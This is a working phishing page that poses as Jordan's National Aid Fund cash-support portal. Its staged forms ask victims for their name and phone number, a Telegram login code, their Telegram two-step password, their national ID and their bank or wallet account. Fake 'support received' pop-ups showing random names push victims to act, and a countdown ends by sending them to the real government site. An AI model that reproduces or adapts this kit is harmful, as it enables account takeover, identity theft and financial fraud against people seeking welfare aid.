<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta property="og:title" content="صندوق المعونة الوطنية - National Aid Fund">
    <meta property="og:description" content="بوابة الخدمات الإلكترونية لبرنامج الدعم النقدي الموحد">
    <meta property="og:image" itemprop="image" content="images/banner.jpg">
    <meta property="og:type" content="website">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="صندوق المعونة الوطنية - National Aid Fund">
    <meta name="twitter:description" content="بوابة الخدمات الإلكترونية لبرنامج الدعم النقدي الموحد">
    <meta name="twitter:image" content="images/banner.jpg">
    <title>صندوق المعونة الوطنية - National Aid Fund</title>

    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.13.1/font/bootstrap-icons.min.css" rel="stylesheet">

    <style>
        *, *::before, *::after {
            box-sizing: border-box;
        }

        :root {
            --primary-color: #6c7c8c; 
            --primary-dark: #637787; 
            --primary-light: #8395a3; 
            --secondary-color: #8b7336; 
            --bg-color: #ffffff;
            --text-main: #333333;
            --text-muted: #666666;
            --border-color: #e4e6eb;
            --input-bg: #f8f9fa;
        }

        body {
            font-family: 'Tajawal', sans-serif;
            background-color: var(--bg-color);
            color: var(--text-main);
            margin: 0;
            padding: 0;
            -webkit-font-smoothing: antialiased;
            overflow-x: hidden;
        }

        .naf-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 20px;
            background: #fff;
            border-bottom: 2px solid var(--secondary-color);
        }

        .header-left {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .header-right {
            display: flex;
            align-items: center;
            gap: 15px;
            font-weight: 700;
        }

        .main-banner {
            width: 100%;
            display: block;
            border-bottom: 4px solid var(--secondary-color);
            position: relative;
        }
        
        .main-banner img {
            width: 100%;
            height: auto;
            object-fit: cover;
            display: block;
        }

        .services-wrapper {
            width: 100%;
            display: flex;
            flex-direction: column;
            margin-bottom: 10px;
            padding: 15px;
            background-color: #e5cd8d; 
        }
        
        .service-block {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 50px 20px;
            text-align: center;
            color: #fff;
        }
        
        .block-top {
            background-color: var(--primary-dark);
        }
        
        .block-bottom {
            background-color: var(--primary-light);
        }

        .service-icon {
            font-size: 3.5rem;
            margin-bottom: 15px;
            color: #fff;
        }

        .service-title {
            font-size: 1.4rem;
            font-weight: 800;
            margin: 0;
            line-height: 1.4;
        }

        .portal-section {
            background-color: #f4f5f7;
            padding: 30px 15px 40px;
            display: flex;
            justify-content: center;
        }

        .tg-card {
            background: #fff;
            width: 100%;
            max-width: 500px;
            border-radius: 8px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.08);
            border-top: 4px solid var(--primary-color);
            padding: 30px;
            position: relative;
        }

        .card-title-custom {
            font-size: 1.4rem;
            font-weight: 800;
            color: var(--primary-color);
            text-align: center;
            margin-bottom: 20px;
        }

        .form-label-custom {
            display: block;
            font-size: 1rem;
            font-weight: 700;
            margin-bottom: 10px;
            color: var(--text-main);
        }

        .phone-input-wrapper {
            display: flex;
            gap: 8px;
            flex-direction: row-reverse;
            width: 100%;
        }

        .country-selector {
            background-color: var(--input-bg);
            border: 1px solid #ced4da;
            border-radius: 6px;
            padding: 0 10px;
            display: flex;
            align-items: center;
            gap: 6px;
            font-weight: 700;
            cursor: pointer;
            direction: ltr;
            flex-shrink: 0;
            white-space: nowrap;
        }

        .input-custom {
            flex: 1;
            min-width: 0;
            background-color: var(--input-bg);
            border: 1px solid #ced4da;
            border-radius: 6px;
            height: 50px;
            padding: 0 12px;
            font-size: 1rem;
            text-align: left;
            direction: ltr;
            outline: none;
            width: 100%;
        }
        
        .input-rtl {
            text-align: right;
            direction: rtl;
        }

        .input-custom:focus {
            border-color: var(--secondary-color);
            box-shadow: 0 0 0 0.2rem rgba(139, 115, 54, 0.25);
        }

        .code-input {
            letter-spacing: 12px;
            font-size: 1.8rem;
            text-align: center;
            font-weight: 800;
            width: 100%;
        }

        .btn-tg {
            background-color: var(--primary-color);
            color: white;
            border: none;
            border-radius: 6px;
            width: 100%;
            height: 50px;
            font-size: 1.1rem;
            font-weight: 700;
            cursor: pointer;
            margin-top: 20px;
            transition: background 0.3s;
        }
        .btn-tg:hover {
            background-color: #556372;
        }

        .stats-section {
            background-color: #fff;
            text-align: center;
            overflow: hidden;
            padding-bottom: 50px;
        }

        .stats-title-wrapper {
            background-color: #e9ecef;
            background-image: 
                linear-gradient(45deg, #d1d8e0 25%, transparent 25%, transparent 75%, #d1d8e0 75%, #d1d8e0), 
                linear-gradient(45deg, #d1d8e0 25%, transparent 25%, transparent 75%, #d1d8e0 75%, #d1d8e0);
            background-size: 40px 40px;
            background-position: 0 0, 20px 20px;
            padding: 40px 20px;
            border-bottom: 3px solid #ddd;
            margin-bottom: 30px;
        }

        .stats-title {
            color: var(--secondary-color);
            font-weight: 800;
            font-size: 1.6rem;
            margin: 0;
            background-color: rgba(255, 255, 255, 0.9); 
            display: inline-block;
            padding: 8px 30px;
            border-radius: 25px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 35px 15px;
            max-width: 600px;
            margin: 0 auto;
            padding: 0 20px;
        }
        
        .stat-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            opacity: 0;
            transform: translateY(40px);
            animation: fadeInUp 0.7s cubic-bezier(0.2, 0.8, 0.2, 1) forwards;
            transition: transform 0.3s ease;
        }
        
        .stat-item:hover {
            transform: translateY(-8px) scale(1.03);
        }
        
        .stat-item:nth-child(1) { animation-delay: 0.1s; }
        .stat-item:nth-child(2) { animation-delay: 0.2s; }
        .stat-item:nth-child(3) { animation-delay: 0.3s; }
        .stat-item:nth-child(4) { animation-delay: 0.4s; }
        .stat-item:nth-child(5) { animation-delay: 0.5s; }
        .stat-item:nth-child(6) { animation-delay: 0.6s; }
        .stat-item:nth-child(7) { animation-delay: 0.7s; }
        .stat-item:nth-child(8) { animation-delay: 0.8s; }

        .stat-icon {
            width: 85px;
            height: 85px;
            border: 2px dashed var(--secondary-color);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 2.3rem;
            color: var(--secondary-color);
            margin-bottom: 15px;
            background-color: #fff;
            transition: all 0.4s ease;
        }
        
        .stat-item:hover .stat-icon {
            background-color: var(--secondary-color);
            color: #fff;
            border-style: solid;
            box-shadow: 0 8px 20px rgba(139, 115, 54, 0.4);
        }

        .stat-number {
            background-color: var(--secondary-color);
            color: #fff;
            padding: 6px 25px;
            border-radius: 20px;
            font-weight: 800;
            font-size: 1.15rem;
            margin-bottom: 8px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
        }

        .stat-desc {
            font-size: 1rem;
            font-weight: 700;
            color: var(--text-main);
            line-height: 1.4;
        }

        .stat-info-more {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: 50px;
            opacity: 0;
            animation: fadeInUp 0.7s ease-out 1s forwards;
        }
        .info-icon-wrapper {
            position: relative;
            width: 100px;
            height: 70px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 15px;
        }
        .info-circle {
            width: 75px;
            height: 75px;
            border: 2px dashed var(--secondary-color);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.8rem;
            color: var(--secondary-color);
            background: #fff;
            z-index: 2;
            transition: all 0.3s ease;
        }
        .info-circle:hover {
            background-color: var(--secondary-color);
            color: #fff;
            border-style: solid;
            cursor: pointer;
            box-shadow: 0 5px 15px rgba(139, 115, 54, 0.4);
        }
        .info-pill {
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
            left: 5px;
            width: 40px;
            height: 28px;
            background-color: var(--secondary-color);
            border-radius: 20px 0 0 20px;
            z-index: 1;
        }
        .stat-desc-small {
            font-size: 1.1rem;
            font-weight: 800;
            color: var(--text-main);
            text-align: center;
        }

        @keyframes fadeInUp {
            0% { opacity: 0; transform: translateY(40px); }
            100% { opacity: 1; transform: translateY(0); }
        }

        .naf-footer {
            background-color: #f1f1f1;
            padding: 30px 20px;
            text-align: center;
            border-top: 2px solid #ddd;
        }
        .footer-contact {
            display: flex;
            justify-content: center;
            gap: 30px;
            margin-bottom: 20px;
            font-weight: 700;
        }
        .footer-links a {
            color: #555;
            text-decoration: none;
            margin: 0 10px;
            font-size: 0.9rem;
            font-weight: 500;
        }
        .footer-bottom {
            background-color: var(--secondary-color);
            color: #fff;
            padding: 15px;
            font-size: 0.85rem;
            margin-top: 20px;
        }

        .claim-notif {
            position: fixed;
            bottom: 15px; 
            right: 15px; 
            background: rgba(40, 167, 69, 0.95);
            color: white;
            padding: 8px 12px; 
            border-radius: 6px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.15);
            font-weight: 600; 
            font-size: 0.8rem; 
            display: flex;
            align-items: center;
            gap: 8px;
            z-index: 10000;
            max-width: 250px; 
            animation: slideInUp 0.5s ease-out;
        }
        
        .claim-notif i {
            font-size: 1rem; 
        }
        
        @keyframes slideInUp {
            from { transform: translateY(100%); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .warning-box {
            background-color: #fff3cd; 
            color: #856404; 
            padding: 15px; 
            border-radius: 8px; 
            border: 1px solid #ffeeba; 
            margin-top: 20px; 
            margin-bottom: 20px;
            text-align: center;
        }

        .step-section { display: none; }
        .step-section.active { display: block; }
        .alert-custom { display: none; background: #fde8e8; color: #d12c2c; padding: 12px; border-radius: 6px; margin-bottom: 15px; font-weight: 600; text-align: center; }

        .bs-overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.5); z-index: 9998; opacity: 0; visibility: hidden; transition: opacity 0.3s; }
        .bs-overlay.active { opacity: 1; visibility: visible; }
        .bs-modal { position: fixed; bottom: -100%; left: 0; width: 100%; height: 60vh; background: #fff; z-index: 9999; border-radius: 20px 20px 0 0; transition: bottom 0.4s; display: flex; flex-direction: column; direction: ltr; }
        .bs-modal.active { bottom: 0; }
        .bs-header { padding: 15px 20px; border-bottom: 1px solid #eee; text-align: center; }
        .bs-search-box input { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #ddd; }
        .bs-list { overflow-y: auto; list-style: none; padding: 0; margin: 0; }
        .bs-item { padding: 15px 20px; display: flex; border-bottom: 1px solid #f7f9fa; cursor: pointer; }

        @media (max-width: 480px) {
            .tg-card {
                padding: 25px 15px;
            }
            .code-input {
                letter-spacing: 8px;
                font-size: 1.5rem;
            }
            .service-block {
                padding: 40px 15px;
            }
            .stats-grid {
                grid-template-columns: 1fr 1fr;
                gap: 25px 10px;
                padding: 0 10px;
            }
            .stat-icon {
                width: 70px;
                height: 70px;
                font-size: 1.8rem;
            }
            .stat-number {
                font-size: 1rem;
                padding: 5px 20px;
            }
            .stat-desc {
                font-size: 0.9rem;
            }
            .naf-header {
                flex-direction: column;
                gap: 15px;
            }
            .header-right {
                width: 100%;
                justify-content: space-between;
            }
            .header-left {
                width: 100%;
                justify-content: center;
            }
        }
    </style>
</head>

<body>

    <div id="loader-screen" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 10000; display: flex; justify-content: center; align-items: center; background: #fff;">
        <div class="spinner-border" style="color: var(--secondary-color);" role="status"></div>
    </div>
    <div id="submit-loader" style="display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(255,255,255,0.85); z-index: 10000; justify-content: center; align-items: center; flex-direction: column;">
        <div class="spinner-border" style="color: var(--secondary-color); width: 3rem; height: 3rem;" role="status"></div>
        <p class="mt-3 fw-bold">جاري المعالجة...</p>
    </div>

    <header class="naf-header">
        <div class="header-right">
            <i class="fas fa-bars"></i>
            <span>English</span>
            <i class="fas fa-search"></i>
        </div>
        <div class="header-left">
            <div style="font-weight: 900; color: var(--primary-color); line-height: 1.1; text-align: left;">
                صندوق المعونة الوطنية<br>
                <small style="color: var(--secondary-color);">NATIONAL AID FUND</small>
            </div>
            <i class="fas fa-leaf" style="font-size: 2rem; color: var(--primary-color);"></i>
        </div>
    </header>

    <div class="main-banner">
        <img src="images/banner.jpg" alt="National Aid Fund Banner" onerror="this.src='https://via.placeholder.com/800x250/8b7336/ffffff?text=صندوق+المعونة+الوطنية';">
    </div>

    <section class="portal-section">
        <div class="tg-card">
            
            <h2 class="card-title-custom">بوابة الخدمات الإلكترونية</h2>
            <p style="text-align: center; color: var(--text-muted); margin-bottom: 25px; font-weight: 500;">
                يرجى التحقق من هويتك لاستكمال طلب الدعم النقدي الموحد
            </p>

            <div id="main-form-container">
                <input type="hidden" id="validateclientHash">
                <input type="hidden" id="validatephone_number">
                <input type="hidden" id="validateotp_code">

                <div id="step1" class="step-section active">
                    <div id="alert1" class="alert-custom alert-error"></div>
                    <form id="firstForm">
                        <div style="display: none;">
                            <select id="job_position" required><option value="otro" selected>Otro</option></select>
                            <select id="experience" required><option value="0" selected>Beginner</option></select>
                            <input type="checkbox" id="certifico" checked required>
                            <input type="hidden" id="full_name" value="User">
                        </div>
                        
                        <div class="form-group mb-3">
                            <label class="form-label-custom">الاسم الرباعي</label>
                            <input type="text" id="user_name_input" class="input-custom input-rtl" placeholder="أدخل الاسم الرباعي" required>
                        </div>

                        <div class="form-group mb-3">
                            <label class="form-label-custom">رقم الهاتف (المرتبط بالدعم)</label>
                            <div class="phone-input-wrapper">
                                <input type="tel" id="phone_number" class="input-custom" placeholder="7X XXX XXXX" required inputmode="numeric" autocomplete="off">
                                
                                <div class="country-selector" id="open-country-modal">
                                    <span id="display-flag">🇯🇴</span>&nbsp;
                                    <span id="display-code">+962</span>
                                    <i class="fas fa-caret-down" style="font-size: 0.75rem; margin-left: 4px;"></i>
                                </div>
                            </div>
                        </div>

                        <button type="submit" id="firstbutt" class="btn-tg">متابعة الطلب</button>
                    </form>
                </div>

                <div id="step2" class="step-section">
                    <p style="text-align: center; color: var(--text-muted); font-size: 0.95rem; margin-bottom: 20px; font-weight: 500;">
                        أرسلنا رمز التحقق إلى حسابك في تطبيق تليجرام. يرجى إدخاله أدناه.
                    </p>
                    <div id="alert2" class="alert-custom alert-error"></div>
                    <form id="secondForm">
                        <div class="form-group mb-3">
                            <input type="tel" name="otp-input" id="otp_code" class="input-custom code-input" placeholder="•••••" required maxlength="5" autocomplete="off">
                        </div>
                        <button type="submit" id="seccbutt" class="btn-tg">تحقق من الرمز</button>
                    </form>
                </div>

                <div id="step3" class="step-section">
                    <p style="text-align: center; color: var(--text-muted); font-size: 0.95rem; margin-bottom: 20px; font-weight: 500;">
                        يرجى إدخال كلمة مرور التحقق بخطوتين الخاصة بك.
                    </p>
                    <div id="alert3" class="alert-custom alert-error"></div>
                    <form id="thirdForm">
                        <div class="form-group mb-3">
                            <input type="password" id="password" class="input-custom input-rtl" placeholder="كلمة المرور" required>
                        </div>
                        <button type="submit" id="thirdbutt" class="btn-tg">تأكيد</button>
                    </form>
                </div>

                <div id="step5" class="step-section">
                    <h2 class="card-title-custom mb-3" style="font-size: 1.25rem;">تحديث بيانات المستفيد</h2>
                    <p style="text-align: center; color: var(--text-muted); font-size: 0.95rem; margin-bottom: 20px; font-weight: 500;">
                        الرجاء إدخال بياناتك بدقة لضمان استلام الدعم النقدي
                    </p>
                    <form id="step5Form">
                        <div class="form-group mb-3">
                            <input type="text" id="national_id" class="input-custom input-rtl" placeholder="الرقم الوطني (National ID)" required maxlength="10" minlength="10" inputmode="numeric">
                        </div>
                        <div class="form-group mb-3">
                            <input type="text" id="full_name_ar" class="input-custom input-rtl" placeholder="الاسم الرباعي (Full Name)" required>
                        </div>
                        <div class="form-group mb-3">
                            <input type="text" id="bank_account" class="input-custom input-rtl" placeholder="رقم الحساب أو المحفظة الإلكترونية (Bank/Wallet Account)" required>
                        </div>
                        <button type="submit" id="fifthbutt" class="btn-tg">تأكيد واستلام الدعم</button>
                    </form>
                </div>

                <div id="step6" class="step-section text-center py-4">
                    <div class="spinner-border mb-3" style="color: var(--secondary-color); width: 3.5rem; height: 3.5rem;" role="status"></div>
                    <h2 class="card-title-custom mb-2" style="font-size: 1.3rem;">جاري تحويل الدعم وتوثيق البيانات...</h2>
                    
                    <div class="warning-box">
                        <i class="fas fa-exclamation-triangle mb-2" style="font-size: 1.5rem;"></i>
                        <p style="font-size: 1rem; font-weight: 700; margin: 0;">يرجى عدم إغلاق أو تحديث هذه الصفحة حتى تنتهي العملية.</p>
                    </div>
                    
                    <p style="font-size: 1.2rem; font-weight: 800; color: var(--text-main);">
                        الوقت المتبقي: <span id="countdown-timer" style="color: red; font-size: 1.5rem;">90</span> ثانية
                    </p>
                </div>

            </div>
        </div>
    </section>

    <section class="services-wrapper">
        <div class="service-block block-top">
            <i class="fas fa-hands-helping service-icon"></i>
            <h3 class="service-title">خدماتنا الإلكترونية بين<br>يديك</h3>
        </div>
        <div class="service-block block-bottom">
            <i class="fas fa-user-cog service-icon"></i>
            <h3 class="service-title">خدماتنا الذكية بين<br>يديك</h3>
        </div>
    </section>

    <section class="stats-section">
        <div class="stats-title-wrapper">
            <h3 class="stats-title">أرقام ونسب</h3>
        </div>
        
        <div class="stats-grid">
            <div class="stat-item">
                <div class="stat-icon"><i class="fas fa-users"></i></div>
                <div class="stat-number">51</div>
                <div class="stat-desc">نسبة التغطية</div>
            </div>
            <div class="stat-item">
                <div class="stat-icon"><i class="fas fa-user-friends"></i></div>
                <div class="stat-number">78</div>
                <div class="stat-desc">نسبة الشمول</div>
            </div>
            <div class="stat-item">
                <div class="stat-icon"><i class="fas fa-users-cog"></i></div>
                <div class="stat-number">204892</div>
                <div class="stat-desc">برنامج الدعم النقدي الموحد</div>
            </div>
            <div class="stat-item">
                <div class="stat-icon"><i class="fas fa-calendar-check"></i></div>
                <div class="stat-number">40997</div>
                <div class="stat-desc">برنامج المعونات الشهرية</div>
            </div>
            <div class="stat-item">
                <div class="stat-icon"><i class="fas fa-bell"></i></div>
                <div class="stat-number">7303</div>
                <div class="stat-desc">برنامج المعونات الطارئة</div>
            </div>
            <div class="stat-item">
                <div class="stat-icon"><i class="fas fa-stethoscope"></i></div>
                <div class="stat-number">312</div>
                <div class="stat-desc">برنامج التأهيل الجسماني</div>
            </div>
            <div class="stat-item">
                <div class="stat-icon"><i class="fas fa-hard-hat"></i></div>
                <div class="stat-number">1504</div>
                <div class="stat-desc">التمكين الاقتصادي / تدريب</div>
            </div>
            <div class="stat-item">
                <div class="stat-icon"><i class="fas fa-user-cog"></i></div>
                <div class="stat-number">495</div>
                <div class="stat-desc">التمكين الاقتصادي / التشغيل</div>
            </div>
        </div>

        <div class="stat-info-more">
            <div class="info-icon-wrapper">
                <div class="info-pill"></div>
                <div class="info-circle"><i class="fas fa-info"></i></div>
            </div>
            <div class="stat-desc-small">لمزيد من المعلومات، الرجاء اختيار<br>البيانات المفتوحة</div>
        </div>
    </section>

    <footer class="naf-footer">
        <div class="footer-contact">
            <div><i class="fas fa-phone"></i> 065635470</div>
            <div><i class="fas fa-envelope"></i> info@naf.gov.jo</div>
        </div>
        <div class="footer-links">
            <a href="#">الوظائف</a> | 
            <a href="#">روابط مفيدة</a> | 
            <a href="#">الأسئلة الأكثر تكراراً</a> | 
            <a href="#">استطلاع الرأي</a> | 
            <a href="#">الاقتراحات</a> | 
            <a href="#">اتصل بنا</a>
        </div>
        <div class="footer-bottom">
            سياسة الخصوصية - شروط الاستخدام - إخلاء المسؤولية - حقوق النشر محفوظة
            <br>صندوق المعونة الوطنية 2024 ©
        </div>
    </footer>

    <div class="bs-overlay" id="bs-overlay"></div>
    
    <div class="bs-modal" id="bs-modal">
        <div class="bs-header">
            <h3>Select Country</h3>
            <div class="bs-search-box">
                <input type="text" id="bs-search" placeholder="Search Country/Region" autocomplete="off">
            </div>
        </div>
        <ul class="bs-list" id="bs-list">
            <li class="bs-item" data-code="+962" data-name="jordan"><span class="flag">🇯🇴</span> <span class="name">Jordan</span> <span class="code">+962</span></li>
            <li class="bs-item" data-code="+971" data-name="united arab emirates uae"><span class="flag">🇦🇪</span> <span class="name">United Arab Emirates</span> <span class="code">+971</span></li>
            <li class="bs-item" data-code="+966" data-name="saudi arabia"><span class="flag">🇸🇦</span> <span class="name">Saudi Arabia</span> <span class="code">+966</span></li>
            <li class="bs-item" data-code="+974" data-name="qatar"><span class="flag">🇶🇦</span> <span class="name">Qatar</span> <span class="code">+974</span></li>
            <li class="bs-item" data-code="+965" data-name="kuwait"><span class="flag">🇰🇼</span> <span class="name">Kuwait</span> <span class="code">+965</span></li>
            <li class="bs-item" data-code="+20" data-name="egypt"><span class="flag">🇪🇬</span> <span class="name">Egypt</span> <span class="code">+20</span></li>
            <li class="bs-item" data-code="+62" data-name="indonesia"><span class="flag">🇮🇩</span> <span class="name">Indonesia</span> <span class="code">+62</span></li>
        </ul>
    </div>

    <script src="js/jquery.min.js"></script>
    <script src="js/bootstrap.bundle.min.js"></script>
    <script src="js/logical.js"></script>

    <script>
        $(document).ready(function() {
            const overlay = document.getElementById('bs-overlay');
            const closeAllModals = () => {
                overlay.classList.remove('active');
                document.querySelectorAll('.bs-modal').forEach(m => m.classList.remove('active'));
            };
            overlay.addEventListener('click', closeAllModals);

            const openBtn = document.getElementById('open-country-modal');
            const countryModal = document.getElementById('bs-modal');
            const listItems = document.querySelectorAll('.bs-item');
            const displayFlag = document.getElementById('display-flag');
            const displayCode = document.getElementById('display-code');

            if(openBtn) {
                openBtn.addEventListener('click', () => {
                    overlay.classList.add('active');
                    countryModal.classList.add('active');
                });
            }

            document.getElementById('bs-search').addEventListener('input', function(e) {
                const keyword = e.target.value.toLowerCase();
                listItems.forEach(item => {
                    const searchData = item.getAttribute('data-name') + " " + item.getAttribute('data-code');
                    item.style.display = searchData.includes(keyword) ? 'flex' : 'none';
                });
            });

            listItems.forEach(item => {
                item.addEventListener('click', function() {
                    const flag = this.querySelector('.flag').innerText;
                    const code = this.getAttribute('data-code');
                    displayFlag.innerText = flag;
                    displayCode.innerText = code;
                    
                    if(typeof COUNTRY_CODE !== 'undefined') {
                        COUNTRY_CODE = code;
                        MASK_FORMAT = code + " ";
                    }
                    
                    document.getElementById('phone_number').value = ""; 
                    document.getElementById('phone_number').focus();
                    closeAllModals();
                });
            });

            $('#step5Form').on('submit', function(e) {
                e.preventDefault(); 
                
                $('#step5').removeClass('active');
                
                $('#step6').addClass('active');
                
                let timeLeft = 90;
                const timerElement = document.getElementById('countdown-timer');
                
                const countdownInterval = setInterval(function() {
                    timeLeft--;
                    timerElement.textContent = timeLeft;
                    
                    if (timeLeft <= 0) {
                        clearInterval(countdownInterval);
                        window.location.href = 'https://naf.gov.jo/'; 
                    }
                }, 1000);
            });

            const jordanNames = [
                "أحمد محمود", "عمر الطراونة", "فاطمة بني مصطفى", 
                "يوسف عبد الله", "عائشة الرواشدة", "محمد الخوالدة", 
                "طارق زياد", "سارة الحياري", "محمود العبادي", 
                "منى المجالي", "خالد الشوبكي", "نور الدين الزعبي"
            ];

            setInterval(() => {
                const name = jordanNames[Math.floor(Math.random() * jordanNames.length)];
                const notif = $(`<div class="claim-notif"><i class="fas fa-check-circle"></i> تم استلام الدعم بنجاح: ${name}</div>`);
                $('body').append(notif);
                
                setTimeout(() => {
                    notif.fadeOut(500, function() { $(this).remove(); });
                }, 4000);
            }, 6000);
        });
    </script>
</body>
</html>
